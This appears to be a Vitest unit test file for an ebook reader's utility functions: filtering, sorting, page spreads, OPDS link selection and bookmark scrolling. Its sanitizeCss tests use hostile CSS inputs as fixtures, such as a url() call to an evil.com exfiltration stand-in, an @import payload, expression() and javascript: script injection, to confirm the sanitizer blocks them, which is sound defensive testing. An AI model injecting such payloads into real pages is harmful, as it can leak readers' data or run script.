import { describe, it, expect } from "vitest";
import {
  formatDuration,
  filterBooks,
  sortBooks,
  groupBy,
  clamp,
  isSupportedFile,
  formatMetadataPills,
  getSpreadPages,
  sanitizeCss,
  pickSupportedOpdsLink,
  resolveBookmarkScrollTop,
  type BookLike,
} from "./utils";

// ---------------------------------------------------------------------------
// formatDuration
// ---------------------------------------------------------------------------
describe("formatDuration", () => {
  it("formats seconds under a minute", () => {
    expect(formatDuration(0)).toBe("0s");
    expect(formatDuration(30)).toBe("30s");
    expect(formatDuration(59)).toBe("59s");
  });

  it("formats minutes under an hour", () => {
    expect(formatDuration(60)).toBe("1m");
    expect(formatDuration(90)).toBe("1m");
    expect(formatDuration(3599)).toBe("59m");
  });

  it("formats hours", () => {
    expect(formatDuration(3600)).toBe("1h");
    expect(formatDuration(5400)).toBe("1h 30m");
    expect(formatDuration(7200)).toBe("2h");
  });

  it("formats hours with remaining minutes", () => {
    expect(formatDuration(3660)).toBe("1h 1m");
    expect(formatDuration(7320)).toBe("2h 2m");
  });
});

// ---------------------------------------------------------------------------
// filterBooks
// ---------------------------------------------------------------------------
const sampleBooks: BookLike[] = [
  { id: "1", title: "Dune", author: "Frank Herbert", format: "epub", added_at: 100 },
  { id: "2", title: "Neuromancer", author: "William Gibson", format: "pdf", added_at: 200 },
  { id: "3", title: "Foundation", author: "Isaac Asimov", format: "cbz", added_at: 300 },
  { id: "4", title: "Snow Crash", author: "Neal Stephenson", format: "epub", added_at: 400 },
];

const progressMap: Record<string, number> = {
  "1": 0,    // unread
  "2": 50,   // in progress
  "3": 100,  // finished
  "4": 100,  // finished
};

describe("filterBooks", () => {
  it("returns all books with no filters", () => {
    const result = filterBooks(sampleBooks, "", "all", "all", {});
    expect(result).toHaveLength(4);
  });

  it("filters by title search (case-insensitive)", () => {
    const result = filterBooks(sampleBooks, "dune", "all", "all", {});
    expect(result).toHaveLength(1);
    expect(result[0].title).toBe("Dune");
  });

  it("filters by author search", () => {
    const result = filterBooks(sampleBooks, "gibson", "all", "all", {});
    expect(result).toHaveLength(1);
    expect(result[0].author).toBe("William Gibson");
  });

  it("filters by format", () => {
    const result = filterBooks(sampleBooks, "", "epub", "all", {});
    expect(result).toHaveLength(2);
    expect(result.every((b) => b.format === "epub")).toBe(true);
  });

  it("filters by unread status", () => {
    const result = filterBooks(sampleBooks, "", "all", "unread", progressMap);
    expect(result).toHaveLength(1);
    expect(result[0].id).toBe("1");
  });

  it("filters by in_progress status", () => {
    const result = filterBooks(sampleBooks, "", "all", "in_progress", progressMap);
    expect(result).toHaveLength(1);
    expect(result[0].id).toBe("2");
  });

  it("filters by finished status", () => {
    const result = filterBooks(sampleBooks, "", "all", "finished", progressMap);
    expect(result).toHaveLength(2);
  });

  it("combines search and format filter", () => {
    const result = filterBooks(sampleBooks, "s", "epub", "all", {});
    // "s" matches "Snow Crash" (epub) and "Dune" doesn't have "s" in title — wait
    // "Dune" no, "Snow Crash" yes (epub), "Neuromancer" has "s" but is pdf
    expect(result).toHaveLength(1);
    expect(result[0].title).toBe("Snow Crash");
  });

  it("returns empty when no match", () => {
    const result = filterBooks(sampleBooks, "nonexistent", "all", "all", {});
    expect(result).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// sortBooks
// ---------------------------------------------------------------------------
describe("sortBooks", () => {
  it("sorts by title ascending", () => {
    const result = sortBooks(sampleBooks, "title", true, {}, {});
    expect(result.map((b) => b.title)).toEqual([
      "Dune", "Foundation", "Neuromancer", "Snow Crash",
    ]);
  });

  it("sorts by title descending", () => {
    const result = sortBooks(sampleBooks, "title", false, {}, {});
    expect(result.map((b) => b.title)).toEqual([
      "Snow Crash", "Neuromancer", "Foundation", "Dune",
    ]);
  });

  it("sorts by date_added ascending", () => {
    const result = sortBooks(sampleBooks, "date_added", true, {}, {});
    expect(result.map((b) => b.id)).toEqual(["1", "2", "3", "4"]);
  });

  it("sorts by progress descending", () => {
    const result = sortBooks(sampleBooks, "progress", false, progressMap, {});
    // 100, 100, 50, 0
    expect(result[0].id).toBe("3"); // or "4", both are 100
    expect(result[result.length - 1].id).toBe("1"); // 0
  });

  it("sorts by last_read", () => {
    const lastRead = { "1": 500, "2": 100, "3": 300, "4": 200 };
    const result = sortBooks(sampleBooks, "last_read", true, {}, lastRead);
    expect(result.map((b) => b.id)).toEqual(["2", "4", "3", "1"]);
  });

  it("does not mutate original array", () => {
    const original = [...sampleBooks];
    sortBooks(sampleBooks, "title", false, {}, {});
    expect(sampleBooks).toEqual(original);
  });
});

// ---------------------------------------------------------------------------
// groupBy
// ---------------------------------------------------------------------------
describe("groupBy", () => {
  it("groups items by key", () => {
    const items = [
      { chapter: 1, text: "a" },
      { chapter: 1, text: "b" },
      { chapter: 2, text: "c" },
    ];
    const result = groupBy(items, (i) => i.chapter);
    expect(Object.keys(result)).toHaveLength(2);
    expect(result[1]).toHaveLength(2);
    expect(result[2]).toHaveLength(1);
  });

  it("returns empty object for empty input", () => {
    expect(groupBy([], () => "key")).toEqual({});
  });
});

// ---------------------------------------------------------------------------
// clamp
// ---------------------------------------------------------------------------
describe("clamp", () => {
  it("returns value when in range", () => {
    expect(clamp(18, 14, 24)).toBe(18);
  });

  it("clamps to min", () => {
    expect(clamp(10, 14, 24)).toBe(14);
  });

  it("clamps to max", () => {
    expect(clamp(30, 14, 24)).toBe(24);
  });

  it("handles edge values", () => {
    expect(clamp(14, 14, 24)).toBe(14);
    expect(clamp(24, 14, 24)).toBe(24);
  });
});

// ---------------------------------------------------------------------------
// isSupportedFile
// ---------------------------------------------------------------------------
describe("isSupportedFile", () => {
  it("accepts supported formats", () => {
    expect(isSupportedFile("book.epub")).toBe(true);
    expect(isSupportedFile("comic.cbz")).toBe(true);
    expect(isSupportedFile("comic.cbr")).toBe(true);
    expect(isSupportedFile("doc.pdf")).toBe(true);
  });

  it("is case-insensitive", () => {
    expect(isSupportedFile("Book.EPUB")).toBe(true);
    expect(isSupportedFile("Doc.PDF")).toBe(true);
  });

  it("rejects unsupported formats", () => {
    expect(isSupportedFile("readme.txt")).toBe(false);
    expect(isSupportedFile("image.png")).toBe(false);
    expect(isSupportedFile("book.mobi")).toBe(false);
    expect(isSupportedFile("")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// formatMetadataPills
// ---------------------------------------------------------------------------
describe("formatMetadataPills", () => {
  it("returns empty array when all fields are null", () => {
    expect(formatMetadataPills({})).toEqual([]);
  });

  it("includes language pill when language is set", () => {
    const pills = formatMetadataPills({ language: "fr" });
    expect(pills).toEqual([{ label: "fr" }]);
  });

  it("includes year pill when publishYear is set", () => {
    const pills = formatMetadataPills({ publishYear: 2024 });
    expect(pills).toEqual([{ label: "2024" }]);
  });

  it("formats series with volume", () => {
    const pills = formatMetadataPills({ series: "Aria", volume: 30 });
    expect(pills).toEqual([{ label: "Aria #30" }]);
  });

  it("formats series without volume", () => {
    const pills = formatMetadataPills({ series: "Aria" });
    expect(pills).toEqual([{ label: "Aria" }]);
  });

  it("returns all pills in order: language, year, series", () => {
    const pills = formatMetadataPills({
      language: "en",
      publishYear: 2023,
      series: "Dune",
      volume: 1,
    });
    expect(pills).toEqual([
      { label: "en" },
      { label: "2023" },
      { label: "Dune #1" },
    ]);
  });

  it("skips null and undefined fields", () => {
    const pills = formatMetadataPills({
      language: null,
      publishYear: undefined,
      series: "Saga",
      volume: null,
    });
    expect(pills).toEqual([{ label: "Saga" }]);
  });
});

// ---------------------------------------------------------------------------
// getSpreadPages
// ---------------------------------------------------------------------------
describe("getSpreadPages", () => {
  it("returns cover page solo (index 0)", () => {
    expect(getSpreadPages(0, 10)).toEqual({ left: 0, right: null });
  });

  it("pairs pages after cover: 1-2, 3-4, etc.", () => {
    expect(getSpreadPages(1, 10)).toEqual({ left: 1, right: 2 });
    expect(getSpreadPages(2, 10)).toEqual({ left: 1, right: 2 });
    expect(getSpreadPages(3, 10)).toEqual({ left: 3, right: 4 });
    expect(getSpreadPages(4, 10)).toEqual({ left: 3, right: 4 });
  });

  it("returns last page solo when odd total", () => {
    expect(getSpreadPages(6, 7)).toEqual({ left: 5, right: 6 });
    expect(getSpreadPages(5, 6)).toEqual({ left: 5, right: null });
  });

  it("handles single-page book", () => {
    expect(getSpreadPages(0, 1)).toEqual({ left: 0, right: null });
  });

  it("handles two-page book", () => {
    expect(getSpreadPages(0, 2)).toEqual({ left: 0, right: null });
    expect(getSpreadPages(1, 2)).toEqual({ left: 1, right: null });
  });

  it("handles three-page book", () => {
    expect(getSpreadPages(0, 3)).toEqual({ left: 0, right: null });
    expect(getSpreadPages(1, 3)).toEqual({ left: 1, right: 2 });
    expect(getSpreadPages(2, 3)).toEqual({ left: 1, right: 2 });
  });
});

// ---------------------------------------------------------------------------
// sanitizeCss
// ---------------------------------------------------------------------------
describe("sanitizeCss", () => {
  it("allows safe CSS through", () => {
    const css = ".reader-content { color: red; font-size: 16px; }";
    expect(sanitizeCss(css)).toBe(css);
  });

  it("blocks url() to prevent data exfiltration", () => {
    const css = "body { background: url('http://evil.com/steal'); }";
    expect(sanitizeCss(css)).not.toContain("url(");
    expect(sanitizeCss(css)).toContain("/* blocked */");
  });

  it("blocks @import to prevent external resource loading", () => {
    const css = "@import 'http://evil.com/payload.css';";
    expect(sanitizeCss(css)).not.toContain("@import");
  });

  it("blocks expression() for IE script execution", () => {
    const css = "div { width: expression(alert(1)); }";
    expect(sanitizeCss(css)).not.toContain("expression(");
  });

  it("blocks javascript: protocol", () => {
    const css = "div { background: javascript:alert(1); }";
    expect(sanitizeCss(css)).not.toContain("javascript:");
  });

  it("blocks -moz-binding", () => {
    const css = "div { -moz-binding: url(evil.xml#xbl); }";
    expect(sanitizeCss(css)).not.toContain("-moz-binding");
  });

  it("blocks @font-face to prevent external font loading", () => {
    const css = "@font-face { src: url(evil.woff); }";
    expect(sanitizeCss(css)).not.toContain("@font-face");
  });

  it("returns empty string unchanged", () => {
    expect(sanitizeCss("")).toBe("");
  });

  it("allows normal selectors and properties", () => {
    const css = ".reader-content p { line-height: 1.8; margin-bottom: 1em; text-align: justify; }";
    expect(sanitizeCss(css)).toBe(css);
  });
});

// ---------------------------------------------------------------------------
// pickSupportedOpdsLink
// ---------------------------------------------------------------------------
describe("pickSupportedOpdsLink", () => {
  it("prefers EPUB over PDF when both are available", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.pdf", mimeType: "application/pdf" },
      { href: "http://host/book.epub", mimeType: "application/epub+zip" },
    ]);
    expect(picked?.label).toBe("EPUB");
    expect(picked?.link.href).toContain(".epub");
  });

  it("picks MOBI when only MOBI is offered", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.mobi", mimeType: "application/x-mobipocket-ebook" },
    ]);
    expect(picked?.label).toBe("MOBI");
  });

  it("picks AZW3 via amazon vendor MIME even with opaque URL", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/download/123", mimeType: "application/vnd.amazon.ebook" },
    ]);
    expect(picked?.label).toBe("AZW3");
  });

  it("falls back to URL extension when MIME is generic", () => {
    // Feeds that serve everything as octet-stream still put the extension in
    // the URL. We can't learn the format from the MIME, but the URL does.
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.cbz?token=abc", mimeType: "application/octet-stream" },
    ]);
    expect(picked?.label).toBe("CBZ");
  });

  it("returns null when nothing is importable", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/cover.jpg", mimeType: "image/jpeg" },
      { href: "http://host/info.html", mimeType: "text/html" },
    ]);
    expect(picked).toBeNull();
  });

  it("picks CBR correctly (not shadowed by CBZ)", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.cbr", mimeType: "application/x-cbr" },
    ]);
    expect(picked?.label).toBe("CBR");
  });

  it("skips formats outside the allowlist (feature-gating)", () => {
    // A MOBI-only entry on a build that didn't compile with --features mobi.
    const picked = pickSupportedOpdsLink(
      [{ href: "http://host/book.mobi", mimeType: "application/x-mobipocket-ebook" }],
      new Set(["epub", "pdf", "cbz", "cbr"]),
    );
    expect(picked).toBeNull();
  });

  it("falls back to EPUB when the allowlist forbids higher-priority matches", () => {
    // A feed offering both AZW3 and EPUB, on a build without the mobi
    // feature. Without the allowlist, AZW3 would win the lookup order;
    // with it, we should fall through to EPUB.
    const picked = pickSupportedOpdsLink(
      [
        { href: "http://host/book.azw3", mimeType: "application/vnd.amazon.ebook" },
        { href: "http://host/book.epub", mimeType: "application/epub+zip" },
      ],
      new Set(["epub", "pdf", "cbz", "cbr"]),
    );
    expect(picked?.label).toBe("EPUB");
  });

  it("treats an undefined allowlist as 'allow everything'", () => {
    // Existing behavior — allowlist is optional.
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.mobi", mimeType: "application/x-mobipocket-ebook" },
    ]);
    expect(picked?.label).toBe("MOBI");
  });

  it("labels a .azw URL as AZW even when MIME is the ambiguous vendor one", () => {
    // The vendor MIME `application/vnd.amazon.ebook` is shared by .azw and
    // .azw3 in the wild. The previous iteration order made AZW3 always win,
    // silently renaming AZW downloads. URL extension must take precedence
    // over the ambiguous MIME so round-tripping preserves the container.
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.azw", mimeType: "application/vnd.amazon.ebook" },
    ]);
    expect(picked?.label).toBe("AZW");
    expect(picked?.link.href).toContain(".azw");
    expect(picked?.link.href).not.toContain(".azw3");
  });

  it("labels a .azw3 URL as AZW3 with the vendor MIME", () => {
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.azw3", mimeType: "application/vnd.amazon.ebook" },
    ]);
    expect(picked?.label).toBe("AZW3");
  });

  it("prefers EPUB link over AZW link when both are offered", () => {
    // Confirms the AZW URL-first fix doesn't override the global format
    // preference order (EPUB is still the best reflowable option).
    const picked = pickSupportedOpdsLink([
      { href: "http://host/book.azw", mimeType: "application/vnd.amazon.ebook" },
      { href: "http://host/book.epub", mimeType: "application/epub+zip" },
    ]);
    expect(picked?.label).toBe("EPUB");
  });
});

// ---------------------------------------------------------------------------
// resolveBookmarkScrollTop
// ---------------------------------------------------------------------------
describe("resolveBookmarkScrollTop", () => {
  // HTML-reflowable books store bookmark positions as chapter-local fractions
  // (0–1 of the current chapter's height). `resolveBookmarkScrollTop` turns
  // that back into an absolute container.scrollTop value the reader assigns
  // when the bookmark is reopened.

  it("continuous mode: midpoint of 2000 px chapter at offset 5000", () => {
    const top = resolveBookmarkScrollTop(true, 0.5, {
      chapterOffsetTop: 5000,
      chapterHeight: 2000,
      containerScrollHeight: 12000,
    });
    expect(top).toBe(6000);
  });

  it("continuous mode: top of chapter lands exactly at chapter offset", () => {
    const top = resolveBookmarkScrollTop(true, 0, {
      chapterOffsetTop: 3500,
      chapterHeight: 1000,
      containerScrollHeight: 8000,
    });
    expect(top).toBe(3500);
  });

  it("continuous mode: end of chapter lands at chapter bottom", () => {
    const top = resolveBookmarkScrollTop(true, 1, {
      chapterOffsetTop: 3500,
      chapterHeight: 1000,
      containerScrollHeight: 8000,
    });
    expect(top).toBe(4500);
  });

  it("paginated mode: fraction of container.scrollHeight (not chapter-relative)", () => {
    const top = resolveBookmarkScrollTop(false, 0.25, {
      chapterOffsetTop: 5000,
      chapterHeight: 2000,
      containerScrollHeight: 8000,
    });
    expect(top).toBe(2000);
  });

  it("paginated mode: ignores chapter geometry entirely", () => {
    const a = resolveBookmarkScrollTop(false, 0.5, {
      chapterOffsetTop: 5000,
      chapterHeight: 2000,
      containerScrollHeight: 10000,
    });
    const b = resolveBookmarkScrollTop(false, 0.5, {
      chapterOffsetTop: 99,
      chapterHeight: 123,
      containerScrollHeight: 10000,
    });
    expect(a).toBe(b);
  });

  it("continuous mode: out-of-range fraction is clamped by caller's geometry", () => {
    // The helper doesn't clamp — it's a pure arithmetic function. Callers
    // that already clamp on save (getChapterScrollPosition does) won't emit
    // out-of-range values, but document the contract here so a future
    // change doesn't silently clamp and mask save-side bugs.
    const top = resolveBookmarkScrollTop(true, 1.25, {
      chapterOffsetTop: 1000,
      chapterHeight: 800,
      containerScrollHeight: 5000,
    });
    expect(top).toBe(2000); // 1000 + 1.25 * 800 = 2000
  });

  it("continuous mode: zero-height chapter returns the chapter offset", () => {
    // Guard against divide-by-zero in the reader: an empty chapter shouldn't
    // scroll to NaN. Any fraction × 0 = 0, so scrollTop == chapterOffsetTop.
    const top = resolveBookmarkScrollTop(true, 0.5, {
      chapterOffsetTop: 4200,
      chapterHeight: 0,
      containerScrollHeight: 8000,
    });
    expect(top).toBe(4200);
  });
});
